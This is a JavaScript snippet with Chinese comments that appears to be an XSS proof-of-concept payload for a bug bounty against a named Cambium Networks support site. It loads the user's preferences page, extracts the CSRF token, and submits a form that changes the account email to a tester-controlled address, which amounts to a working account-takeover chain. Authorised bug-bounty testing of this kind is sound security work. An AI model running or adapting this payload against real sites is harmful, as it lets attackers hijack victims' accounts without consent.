fetch('https://qa-support.cloud.cambiumnetworks.com/preferences') // 确保替换为目标网站正确的URL
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text(); // 获取响应文本
    })
    .then(data => {
        // 创建一个新的DOM解析器实例
        const parser = new DOMParser();
        // 解析字符串为HTML文档
        const doc = parser.parseFromString(data, 'text/html');
        // 查找包含csrf_token的input元素
        const csrfTokenElement = doc.querySelector('input[name="csrf_token"]');
        if (csrfTokenElement) {
            // 提取value属性值
            const csrfToken = csrfTokenElement.getAttribute('value');
            console.log('CSRF Token:', csrfToken);
            let formData = new FormData();
            formData.append('_charset_', 'UTF-8');
            formData.append('__formid__', 'deform');
            formData.append('csrf_token', csrfToken);
            formData.append('newemail', 'esperamier+xss1@intigriti.me');
            formData.append('request', 'request');
            
            fetch("https://qa-support.cloud.cambiumnetworks.com/preferences/email", {
                method: 'POST',
                headers: {
                    // 注意：使用FormData时，不需要手动设置Content-Type头部，浏览器会自动设置
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                },
                body: formData,
            })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error('Error:', error));
        } else {
            console.error('CSRF token not found.');
        }
    })
    .catch(error => {
        console.error('There has been a problem with your fetch operation:', error);
    });

